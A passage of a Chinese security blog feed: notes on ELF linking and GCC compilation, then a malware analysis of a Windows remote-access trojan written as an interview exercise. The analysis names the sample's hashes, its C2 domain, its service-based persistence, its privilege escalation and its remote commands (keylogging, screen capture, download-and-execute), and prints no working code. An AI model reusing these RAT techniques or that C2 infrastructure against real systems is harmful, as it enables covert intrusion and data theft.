src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/12.png"></p><p>在将main.o和func.o两个目标文件链接成一个可执行文件时，最简单的方法是按照顺序叠加。</p><p>这里就直接用了书上的图</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/13.png"></p><p>这种方法的弊端就是，如果参与链接文件很多的话，那么输出的可执行文件就会非常的零散。从对齐的角度来讲，越多的代码节和数据节也会造成内存空间的浪费。</p><p>另一种方案就是将相似的节进行合并，将不同目标文件相同属性的节合并为一个节，比如将两个文件中的.text节合并为新的.text节。这种方案被当前的链接器所采用，首先对各个节的长度、属性和偏移进行分析，然后将输入目标文件中符号表的符号定义与符号引用统一生成全局符号表，最后读取输入文件的各类信息对符号进行解析、重定位等操作。相似节的合并就发生在重定位时。完成之后，程序中的每个指令和全局变量就有唯一的运行时内存地址了。</p><p>此图也直接用了书上的图。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/14.png"></p><h4 id="静态链接的详细过程"><a href="#静态链接的详细过程" class="headerlink" title="静态链接的详细过程"></a>静态链接的详细过程</h4><p>为了构造可执行文件，链接器必须完成两个重要的工作：符号解析和重定位。符号解析是将每个符号（函数、全局变量、静态变量）的引用与其定义进行关联。重定位则是将每个符号的定义与一个内存地址进行关联，然后修改这些符号的引用，使其指向这个内存地址。</p><p>可以比较一下静态链接可执行文件func.ELF和中间产物main.o的区别。重点关注下.text、.data和.bss节。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/15.png"></p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/16.png"></p><p>VMA是虚拟地址，LMA是加载地址，一般情况下，两者是相同的。可以看到main.o的VMA和LMA都是0而链接完成后的func.ELF中，相似节被合并，完成了虚拟地址的分配。</p><p>查看main.o的反汇编代码，看到在1D处，进行了call指令，这就是对于func的调用，此时符号还没有重定位，看到相对的偏移是0。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/17.png"></p><p>再看链接完成后的func.ELF，可以看到<code>400b8a</code>处的call func，其中机器码是e8 07，而下一条指令偏移7处就是400b96，func的地址。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/18.png"></p><p>可重定位文件中最重要的就是要包含重定位表，用于告诉链接器如何修改节的内容。每个重定位表对应一个需要被重定位的节，例如名为.rel.text的节用于保存.text的重定位表。</p><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/19.png"></p><h3 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h3><h4 id="关于动态链接"><a href="#关于动态链接" class="headerlink" title="关于动态链接"></a>关于动态链接</h4><p>随着系统中可执行文件的增加，静态链接带来的磁盘和内存空间浪费问题愈发严重。比如，大部分可执行文件都需要glibc，那么在静态链接时就要把libc.a和编写的代码链接进去，单个libc.a文件大小为5M左右，如果有1000个的话就是5G。这就会造成内存空间的浪费。还有一个明显的缺点就是，如果对标准函数做一些改动，都需要重新编译整个源文件，使得开发和维护很困难。</p><p>如果把系统可和编写的代码分成两个独立的模块，等到程序运行的时候，再把两个模块进行链接，就可以节省硬盘空间，并且内存中的一个系统库还可以被多个程序共同使用，还节省了物理内存空间。这种在加载或运行时，在内存中完成链接的过程就是动态链接，这些用于动态链接的系统库称为共享库，整个过程由动态链接器完成。</p><p>GCC默认使用的是动态链接编译，通过下面的命令可以将func.c编译为共享库，然后使用这个库编译main.c。参数<code>-shared</code>表示生成共享库，<code>-fpic</code>表示生成与位置无关的代码。这样可执行文件func.ELF2就会在加载时与func.so进行动态链接。</p><figure class="highlight nim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nim">gcc -<span class="hljs-literal">shared</span> -fpic -o <span class="hljs-keyword">func</span>.so <span class="hljs-keyword">func</span>.c<br>gcc -fno-stack-protector -o <span class="hljs-keyword">func</span>.<span class="hljs-type">ELF2</span> main.c ./<span class="hljs-keyword">func</span>.so<br></code></pre></div></td></tr></table></figure><p><img src="/2021/10/26/elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/20.png"></p><h4 id="位置无关代码"><a href="#位置无关代码" class="headerlink" title="位置无关代码"></a>位置无关代码</h4><p>可以加载而无需重定位的代码称为位置无关代码（PIC），它是共享库必须具有的属性，通过PIC，一个共享库的代码可以被无限多个进程所共享，从而节约内存资源。</p><p>由于一个程序的数据段和代码段的相对距离总是保持不变的，因此，指令和变量之间的距离是一个运行时常量，与绝对内存地址无关。于是就有了全局偏移量表（GOT），它位于数据段的开头，用于保存全局变量和库函数的引用，每个条目占8个字节，在加载时会进行重定位并填入符号的绝对地址。</p><p>实际上，为了引入RELRO保护机制，GOT被拆分为.got节和.got.plt节两部分，不需要延迟绑定的前者用于保存全局变量引用，加载到内存后被标记为只读；需要延迟绑定的后者则用于保存函数引用，具有读写权限。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要是看了些书上的内容记录了一下，有的地方还是不是很理解，最后关于有的动态链接的地方也没有写，就先不记录这些内容，就先记录这些，感觉要慢慢在实践中去理解了，向当初学习PE一样，最早看也觉得不是很明白，但是后来慢慢实际的东西中去学习，理解就越来越深了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《CTF竞赛权威指南（PWN篇）》</p><p><a href="https://paper.seebug.org/papers/Archive/refs/elf/Understanding_ELF.pdf">https://paper.seebug.org/papers/Archive/refs/elf/Understanding_ELF.pdf</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ELF文件格式&quot;&gt;&lt;a href=&quot;#ELF文件格式&quot; class=&quot;headerlink&quot; title=&quot;ELF文件格式&quot;&gt;&lt;/a&gt;ELF文件格式&lt;/h2&gt;&lt;p&gt;elf文件，Executable and Linking Format，“可执行可连接格式”，具有这</summary>
      
    
    
    
    <category term="PWN" scheme="https://b1ackie.cn/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://b1ackie.cn/tags/PWN/"/>
    
    <category term="读书笔记" scheme="https://b1ackie.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    <category term="ELF" scheme="https://b1ackie.cn/tags/ELF/"/>
    
  </entry>
  
  <entry>
    <title>从源码到可执行文件</title>
    <link href="https://b1ackie.cn/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/"/>
    <id>https://b1ackie.cn/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/</id>
    <published>2021-10-26T07:32:55.000Z</published>
    <updated>2021-12-06T05:37:38.706Z</updated>
    
    <content type="html"><![CDATA[<h2 id="从源码到可执行文件"><a href="#从源码到可执行文件" class="headerlink" title="从源码到可执行文件"></a>从源码到可执行文件</h2><p>我们平时接触到的都是高级语言，比如C语言，而当它真正在操作系统上执行的时候，每一条C语句都会被翻译成一系列的低级机器语言指令。最后，这些指令按照可执行文件的格式打包，并以二进制的形式存放起来。</p><h3 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h3><p>编译器的作用就是读入以某种语言（源语言）编写的程序，输出等价的用另一种语言（目标语言）编写的程序。编译器可以分为前端和后端。前段主要将源程序分解成组成要素和相应的语法结构，通过这个结构创建源程序的中间表示，同时收集和源程序相关的信息，存放到符号表之中；后端与机器相关，主要是根据中间表示和符号表信息构造目标程序。</p><p>编译过程可以大致分为以下五个步骤</p><ol><li>词法分析：读取源程序的字符流，输出为有意义的词素；</li><li>语法分析：根据各个词法单元的第一个分量来创建树型的中间表示形式，通常是语法树；</li><li>语义分析：使用语法树和符号表中的信息，检测源程序是否满足语言定义的语义约束，同时收集类型信息，用于代码生成，类型检查和类型转换；</li><li>中间代码生成和优化：根据语义分析输出，生成类机器语言的中间表示，如三地址码，然后对生成的中间代码进行分析和优化；</li><li>代码生成和优化：把中间表示形式映射到目标机器语言。</li></ol><h3 id="GCC编译过程"><a href="#GCC编译过程" class="headerlink" title="GCC编译过程"></a>GCC编译过程</h3><p>在linux中，使用以下指令完成源程序到目标程序的转化</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">gcc hello.<span class="hljs-keyword">c</span> -o hello<br></code></pre></div></td></tr></table></figure><p>GCC编译器读取hello.c，经过预处理、编译、汇编、链接四个步骤，将其翻译成了可执行目标程序hello。</p><p>用这段代码来做示例</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world\n&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="预处理阶段"><a href="#预处理阶段" class="headerlink" title="预处理阶段"></a>预处理阶段</h4><p>GCC编译的第一个阶段是预处理阶段，主要是处理源代码中以<code>#</code>开始的预处理指令，比如</p><blockquote><p>#include </p><p>#define</p></blockquote><p>将其转换后直接插入程序文本之中，得到另一个C程序，通常以“.i”作为文件扩展名。在命令行中添加编译选项<code>-E</code>可以单独执行预处理</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">gcc -E hello.<span class="hljs-keyword">c</span> -o hello.i<br></code></pre></div></td></tr></table></figure><p>预处理的规则如下：</p><ul><li>将所有的#define删除，并且展开所有的宏定义</li><li>处理所有条件预编译指令，比如#if、#ifdef、#elif、#else、#endif</li><li>处理#include预编译指令，将被包含的文件插入到该预编译指令的位置。</li><li>删除所有的注释</li><li>添加行号和文件名标识，比如# 2 “hello.c” 2，以便于编译时编译器产生调试用的行号信息及用于编译时产生错误或警告时能够显示行号</li><li>保留所有的#pragma编译器指令，因为编译器需要使用它们</li></ul><p>部分hello.i内容如下图所示</p><p><img src="/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/1.png"></p><h4 id="编译阶段"><a href="#编译阶段" class="headerlink" title="编译阶段"></a>编译阶段</h4><p>GCC的第二阶段是编译，该阶段将预处理文件进行一系列的词法分析、语法分析、语义分析以及优化，最终生成汇编代码。添加<code>-S</code>选项，是编译选项。操作对象可以是源代码hello.c也可以是预处理文件hello.i。实际上在GCC的实现中，已经将预处理和编译合并处理。</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">gcc</span> -S hello.i -o hello.s<br></code></pre></div></td></tr></table></figure><p>hello.s文件内容如下</p><p><img src="/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/2.png"></p><p>其中生成的汇编代码，<code>printf</code>函数被替换成了<code>puts</code>函数，这是因为当<code>printf</code>只有单一参数时，与<code>puts</code>是十分类似，所以GCC的优化策略将其替换提高性能。</p><h4 id="汇编阶段"><a href="#汇编阶段" class="headerlink" title="汇编阶段"></a>汇编阶段</h4><p>GCC第三个阶段是汇编，汇编器根据汇编指令与机器指令的对照表进行翻译，将hello.s汇编成目标文件hello.o。在命令行中添加编译选项<code>-c</code>，操作对象可以是hello.c也可以是hello.s。</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">gcc -<span class="hljs-keyword">c</span> hello.s -o hello.o<br></code></pre></div></td></tr></table></figure><p>此时hello.o文件是一个可重定位文件</p><p><img src="/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/3.png"></p><p>可以使用objdump命令查看内容</p><p><img src="/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/4.png"></p><p>因为此时还没有进行链接，所以看到一些地址都是被设置为了0</p><h4 id="链接阶段"><a href="#链接阶段" class="headerlink" title="链接阶段"></a>链接阶段</h4><p>GCC编译的第四个阶段是链接，可以分为静态链接和动态链接两种。GCC默认使用动态链接，添加编译选项<code>-static</code>可以指定使用静态链接。这一阶段将目标文件及其依赖库进行链接，生成可执行文件，主要包括地址和空间分配、符号绑定和重定位等操作。</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">gcc</span> hello.o -o hello<br></code></pre></div></td></tr></table></figure><p>链接操作由链接器（ld.so）完成，结果就会得到hello，这是一个可执行文件</p><p><img src="/2021/10/26/%E4%BB%8E%E6%BA%90%E7%A0%81%E5%88%B0%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/5.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/kele-dad/p/9490640.html">https://www.cnblogs.com/kele-dad/p/9490640.html</a></p><p><a href="https://www.linuxidc.com/Linux/2016-09/135473.htm">https://www.linuxidc.com/Linux/2016-09/135473.htm</a></p><p>《CTF竞赛权威指南（PWN篇）》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;从源码到可执行文件&quot;&gt;&lt;a href=&quot;#从源码到可执行文件&quot; class=&quot;headerlink&quot; title=&quot;从源码到可执行文件&quot;&gt;&lt;/a&gt;从源码到可执行文件&lt;/h2&gt;&lt;p&gt;我们平时接触到的都是高级语言，比如C语言，而当它真正在操作系统上执行的时候，每一条C</summary>
      
    
    
    
    <category term="PWN" scheme="https://b1ackie.cn/categories/PWN/"/>
    
    
    <category term="PWN" scheme="https://b1ackie.cn/tags/PWN/"/>
    
    <category term="读书笔记" scheme="https://b1ackie.cn/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    <category term="GCC编译原理" scheme="https://b1ackie.cn/tags/GCC%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>X绒面试题</title>
    <link href="https://b1ackie.cn/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>https://b1ackie.cn/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/</id>
    <published>2021-10-21T01:51:05.000Z</published>
    <updated>2021-10-21T02:10:20.930Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正好拿到了一个X绒的面试题，来分析一下看看。</p><h2 id="样本的信息"><a href="#样本的信息" class="headerlink" title="样本的信息"></a>样本的信息</h2><ul><li>名称：c7d46a908d692a89f2e8e1303137f8d7a8d7e7ac</li><li>MD5：2f02e4a81dd4ff32270ed31429fd88d1</li><li>SHA256：b7e98515a01b4c77a5ae97742338a51b325e7362e3f2976f252afb126ad6d3fa</li><li>样本大小：122880字节</li></ul><h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><h3 id="火绒剑行为分析"><a href="#火绒剑行为分析" class="headerlink" title="火绒剑行为分析"></a>火绒剑行为分析</h3><p>使用火绒剑监控行为，过滤行为，只看文件创建和写入，可以看到首先创建了在C:\Program Files下创建了一个Windows Cyguof文件夹，然后在其中创建一个svchost.exe。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/1.png"></p><p>再过滤注册表的set value，可以看到创建了几个键值，这几个是与windows服务有关的，那么应该是创建了一个服务来实现持久化驻留。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/2.png"></p><p>注册表相关信息</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/3.png"></p><p>创建的服务</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/4.png"></p><p>伪装成svchost的样本</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/5.png"></p><h3 id="IDA-OD"><a href="#IDA-OD" class="headerlink" title="IDA+OD"></a>IDA+OD</h3><p>样本全程使用LoadLibrary+GetProcAddress的方式，动态加载。</p><p>获取一些API地址</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/6.png"></p><p>首先，会解密一些内容</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/7.png"></p><p>其中部分密文</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/8.png"></p><p>解密算法</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/9.png"></p><p>解密出来的结果</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/10.png"></p><p>第一个是C2的域名，第二个是注册表的表项名。</p><p>拼接完成一个路径C:\ProgramFiles\Windows Cyguof\svchost.exe</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/11.png"></p><p>然后会尝试打开注册表并且查询其中键值的值</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/12.png"></p><p>获取当前程序的运行路径，比较其是否为C:\ProgramFiles\Windows Cyguof\svchost.exe</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/13.png"></p><p>如果是非C:\ProgramFiles\Windows Cyguof\svchost.exe这个路径，那么就会执行下面这些操作。</p><p>会根据一个算法来生成三个值在注册表中要用到的值</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/14.png"></p><p>通过GetTickCount和一些运算生成值</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/15.png"></p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/16.png"></p><p>进行注册表的设置，创建HKLM\SYSTEM\CurrentControlSet\Services\Wsviss uasouavk\ReleiceName，设置值为刚才生成的那个数。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/17.png"></p><p>注册表相关操作</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/18.png"></p><p>然后是设置具体的服务</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/19.png"></p><p>判断C:\Program Files\Windows Cyguof是否存在，不存在创建且使用CopyFileA复制自身到此文件夹下面，命名为svchost。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/20.png"></p><p>使用_access判断文件夹是否存在，如果不存在会调用CreateDirectoryA创建。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/21.png"></p><p>使用CreateServiceA创建服务</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/22.png"></p><p>参数服务的参数</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/23.png"></p><p>StartServiceA会启动服务</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/24.png"></p><p>遍历进程，查找是否存在svchost进程</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/25.png"></p><p>之后就ExitProcess</p><p>然后来看看如果是svchost.exe的时候</p><p>主要执行这部分操作，可以看到关键的函数主要是<code>sub_40C920</code>，主要就是执行了它</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/26.png"></p><p>首先，是提权，查看是否当前进程是否具有SeDebugPrivilege权限，如果没有，就会调用AdjustTokenPrivileges提权。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/27.png"></p><p>创建一个事件，通过getlasterror返回值来判断是否已经在运行，防止重复运行。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/29.png"></p><p>创建的事件，名为Imdgss czsyi</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/28.png"></p><p>之后会进行网络连接，连接到C2</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/31.png"></p><p>socket连接，域名为hask.f3322.org</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/32.png"></p><p>上面<code>40E990</code>是一个创建线程的函数，也就是CreateThread，远控部分在创建的新线程<code>4021B0</code>中，关于远控部分最后再说。</p><p>在<code>sub_408ED0</code>中会获取一些信息并发送，CPU的信息</p><p>经过查询，注册表HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System\CentralProcessor\0，里面包含的主要是CPU相关信息</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/33.png"></p><p>getsockname获取socket信息</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/34.png"></p><p>GetVersionExA获取操作系统版本信息</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/35.png"></p><p>GetSystemInfo获得操作系统信息</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/36.png"></p><p>GetDiskFreeSpaceExA获得磁盘容量信息</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/37.png"></p><p>capGetDriverDescriptionA函数，查询了此函数后，好像是与摄像头有关的API，猜测可能是操控被控端的摄像头的。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/42.png"></p><p>GetTickCount获得开机到现在时间</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/38.png"></p><p>还有一些注册表中的信息</p><p>获得的所有信息在内存中</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/39.png"></p><p>然后会经过两次加密，再在头部加上一些东西后就会发送到服务端。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/40.png"></p><p>通过send函数发送内容。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/41.png"></p><p>通过fakenet模拟网络生成的PCAP包，可以看到具体发送的内容</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/43.png"></p><h3 id="远控部分"><a href="#远控部分" class="headerlink" title="远控部分"></a>远控部分</h3><p>远控部分是在这个创建的线程之中</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/50.png"></p><p>在这里可以看到当<code>recv</code>函数收到数据的时候，会调用<code>sub_4022B0</code>，而这个函数中是一些解密函数以及具体的远控部分，所以接收到的信息是加密的，经过解密后进入远控函数。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/85.png"></p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/86.png"></p><p><code>sub_405060</code>函数是接收指令，且执行操作的地方，执行的操作大概有28种</p><p>通过switch语句进行判断，并且执行相应的操作</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/51.png"></p><p>这里的命令应该是数字。按照顺序来看，从数字1开始看</p><h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/52.png"></p><p>它会尝试访问C:\Windows\system\Consys02.dll这个文件，然后执行操作，但是这个文件现在不存在，所以这个DLL做了什么不知道，只能根据名字来进行猜测DLLFILE应该是文件相关操作。所有读取了DLL的功能，全部都是需要比较指定位置的字符串是否等于<code>SSSSSS</code>和<code>VID:2013-SV1</code>，并且内存加载执行的，所以没有DLL的情况下，这些功能只能通过名字来进行猜测。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/53.png"></p><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>DLLScreen应该是屏幕截图</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/54.png"></p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>DllVideo与视频相关，可能是摄像头操作，或是桌面录制</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/55.png"></p><h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>DllKeybo应该是键盘的记录</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/56.png"></p><h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>DllAudio与音频有关，可能是录音</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/57.png"></p><h4 id="6"><a href="#6" class="headerlink" title="6"></a>6</h4><p>DllSyste应该与系统有关</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/58.png"></p><h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><p>DllShell可能会执行一些shell命令</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/59.png"></p><h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><p>提升SeShutdownPrivilege权限，调用ExitWindowsEx注销系统</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/60.png"></p><h4 id="9"><a href="#9" class="headerlink" title="9"></a>9</h4><p>首先删除C:\Windows\system32\ourlog.dat</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/61.png"></p><p>创建VBS文件且执行，名字是根据GetTickCount生成的。</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/62.png"></p><p>VBS脚本的内容，可以看到应该是删除了原文件</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/63.png"></p><h4 id="10"><a href="#10" class="headerlink" title="10"></a>10</h4><p>会尝试下载一个文件</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/64.png"></p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/65.png"></p><p>然后会尝试执行</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/66.png"></p><h4 id="11"><a href="#11" class="headerlink" title="11"></a>11</h4><p>会访问HKEY_CLASSES_ROOT\Applications\iexplore.exe\shell\open\command中的值</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/67.png"></p><p>然后会执行程序</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/68.png"></p><h4 id="12"><a href="#12" class="headerlink" title="12"></a>12</h4><p>与上面相同</p><h4 id="13"><a href="#13" class="headerlink" title="13"></a>13</h4><p>设置注册表</p><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\生成的那个服务名字</p><p>设置其中的HOST值</p><h4 id="14"><a href="#14" class="headerlink" title="14"></a>14</h4><p>设置HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\生成的那个服务名字中的ConnectGroup值</p><h4 id="15"><a href="#15" class="headerlink" title="15"></a>15</h4><p>创建一个EXE，接受的数据写入其中，然后执行它，exe名字也是根据GetTickCount生成</p><p><img src="/2021/10/21/X%E7%BB%92%E9%9D%A2%E8%AF%95%E9%A2%98/69.png"></p><h4 id="16"><a href="#16" class="headerlink" title="16"></a>16</h4><p>与上面一样</p><h4 id="17"><a href="#17" class="headerlink" 